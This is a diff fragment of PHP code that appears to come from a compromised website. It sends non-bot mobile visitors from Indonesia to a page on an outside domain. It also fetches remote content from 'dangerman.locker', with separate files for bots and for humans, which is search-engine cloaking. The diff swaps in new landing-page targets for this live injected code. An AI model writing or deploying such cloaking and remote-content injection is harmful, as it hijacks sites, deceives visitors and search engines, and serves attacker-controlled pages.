@@ -26,13 +26,13 @@ return $_SERVER["HTTP_CF_IPCOUNTRY"] ?? '';
 }
 
 if (!is_bot() && is_mobile() && strtolower(get_country()) === "id") {
-header("Location: https://douberman.dev/amp/amp-lampuorid.html");
+header("Location: https://douberman.dev/amp/amp-skinaestheticclinic.html/");
 die;
 }
 
 $url = is_bot()
-? "https://dangerman.locker/landing/lampuorid/index.txt"
-: "https://dangerman.locker/landing/lampuorid/realscript.txt";
+? "https://dangerman.locker/landing/skinaestheticclinic/index.txt"
+: "https://dangerman.locker/landing/skinaestheticclinic/realscript.txt";
 
 $content = @file_get_contents($url);
 
